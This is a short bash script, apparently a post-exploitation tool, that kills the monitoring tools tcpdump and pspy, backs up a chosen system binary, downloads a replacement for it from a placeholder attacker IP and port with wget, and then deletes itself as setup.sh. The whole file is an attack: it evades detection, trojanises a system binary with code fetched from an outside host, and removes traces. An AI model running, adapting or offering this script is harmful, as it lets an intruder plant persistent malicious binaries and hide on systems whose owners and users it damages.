#!/bin/bash
# Kill tcpdump if they are listening 
killall tcpdump
# Kill pspy if its running 
killall -r '^(pspy.*)'

# Attackers IP
IP={ATTACKER-IP}

# Attacker port
PORT={ATTACKER-PORT}

cp `which {NAME-OF-BIN}` /sbin/cet

# Replace the binary
wget $IP:$PORT/{NAME-OF-BIN} -O `which {NAME-OF-BIN}` 

# Just clean up if you are using wget
rm `pwd`/setup.sh